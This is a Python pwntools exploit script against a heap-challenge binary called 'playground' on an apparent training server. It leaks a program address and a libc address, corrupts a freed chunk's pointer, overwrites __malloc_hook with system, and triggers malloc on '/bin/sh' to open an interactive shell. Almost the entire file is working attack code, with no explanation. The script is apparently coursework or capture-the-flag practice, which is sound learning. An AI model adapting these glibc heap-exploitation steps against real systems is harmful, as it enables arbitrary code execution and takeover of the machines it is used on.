#!/usr/bin/python3
from pwn import *
import re
PROGRAM = "./playground"
HOST    = "training.jinblack.it"
PORT    = 4010 
LIBC    = "./libc-2.27.so"
#NX     Y
#PIE    Y
#ASLR   Y
GDB_c   = """ 
    brva  0x000012e7
    brva  0x00001349
    command 1
    x /2gx 0x000040a0
    end
          """
if args.GDB:
    r = process(PROGRAM)
    pid, Gdb = gdb.attach(r, GDB_c, api=True)
    input("[!] Waiting for gdb...")
elif args.REMOTE:
    r = remote(HOST, PORT)
else:
    r = process(PROGRAM)

"""
bpython
from pwn import *
a ="0x4743843"
dir(gdb.Gdb)
hex(int(a,16))
help(gdb )
r = re.match("([\w]+):\s\s\s([\w]+|[\s]+)", "0x556f01d8f1d9:      ")
r = re.match("([\w]+):\s\s\s([\w]+|[\s]+)", "> ")
if r:
    r.group(1)

"""

def leak_main():
    # r.recvline()
    r.recvuntil("main: ")
    line = r.recvline()[:-1]
    line = line.decode()
    main = int(line,16)
    return main

def alloc(size):
    log.info("Malloc(0x%x)", size)
    r.recvuntil("> ")
    payload     = b"malloc "
    payload    += (str(size)).encode()
    r.sendline(payload)
    r.recvuntil("==> ")
    addr = r.recvline()[:-1]
    addr = addr.decode()
    return int(addr,16)

def alloc_mod(addr):
    log.info("Malloc mod")
    r.recvuntil("> ")
    payload     = b"malloc "
    payload    += str(addr).encode()
    r.sendline(payload)

def write(where, what, size):
    log.info("Write at 0x%x of 0x%x with size 0x%x", where, u64(what), size)
    assert isinstance(what, bytes)
    
    r.recvuntil("> ")
    payload     = b"write "
    payload    += (str(where)).encode()
    payload    += b" "
    payload    += (str(size)).encode()
    r.sendline(payload)
    
    r.recvuntil("==> read\n")
    r.send(what)
    r.recvuntil("==> done\n",timeout=2)

def show(where, size_in_gx=1):
    """size is the multiple of 8 bytes to print"""
    r.recvuntil("> ")
    payload     = b"show "
    payload    += (str(where)).encode() 
    payload    += b" "
    payload    += (str(size_in_gx)).encode()
    r.sendline(payload)
    
    log.info("Reading at 0x%x", (where))
    lines = r.recvlines(size_in_gx)
    return lines

def free(where):
    log.info("free((void*)0x%x)", where)
    r.recvuntil("> ")
    payload     = b"free "
    payload    += (str(where)).encode()
    r.sendline(payload)
    r.recvuntil("==> ok\n")

def free_mod(where):
    log.info("free((void*)0x%x)", where)
    r.recvuntil("> ")
    payload     = b"free "
    payload    += (str(where)).encode()
    r.sendline(payload)

def show_lines(lines):
    for line in lines:
        exp = re.match("([\w]+):([\s]{0,3})([\w]+|[\s]+)", line.decode() )
        if exp:
            print(exp.group(1),":", "\t",  exp.group(3), "\n")

libc = ELF(LIBC)

one_gadget = [0x4f3d5, 0x4f432, 0x10a41c]
main = leak_main()
base = main - 0x11d9
min_heap = base + 0x000040a8
max_heap = base + 0x000040a0

log.info("Main @ 0x%x", main)

# Gdb.Breakpoint((str(hex(main + 0x00001587))))0x2e4f

addr = alloc(0x20)

# lines = show(addr-0x40, 0x20//8)
# print(lines)
c1 = alloc(0x410)
c2 = alloc(500) # avoid consolidation
free(c1)

# lines = show(c1-0x10, 0x40//8)
# show_lines(show(c1-0x10, 0x40//8))


leak_getpid = show(base + 0x4028, 1)[0].decode()
leak_getpid = re.search("([\w]+):\s\s\s([\w]+)", leak_getpid).group(2)
leak_getpid = int(leak_getpid, 16)

offset_getpid = libc.symbols['getpid']
log.info("offset_getpid @ 0x%x", offset_getpid)

libc.address = leak_getpid - offset_getpid

assert (libc.address % 16**3) == 0
log.info("libc @ 0x%x", libc.address)
malloc_hook = (libc.symbols['__malloc_hook'])
free_hook = (libc.symbols['__free_hook'])

if args.GDB:
    Gdb.execute("x /1gx "+ (str(base+0x40a0)))
    Gdb.execute("x /1gx "+ (str(base+0x40a8)))

show_lines(show(c1-0x10, 0x40//8))
write(c1+8, p64(max_heap-16), 8)
show_lines(show(c1-0x10, 0x40//8))
c3 = alloc(0x410)
assert c1 == c3
show_lines(show(c1-0x10, 0x40//8))
show_lines(show(max_heap,2))

show_lines(show(malloc_hook,1))
write(malloc_hook, p64(libc.symbols['system']), 8)
show_lines(show(malloc_hook,1))

binsh = next(libc.search(b"/bin/sh\x00"))
print(binsh)
# free_mod(0x483493439)

# write(binsh, p64(libc.symbols['read']), 8)

alloc_mod(binsh)

r.interactive()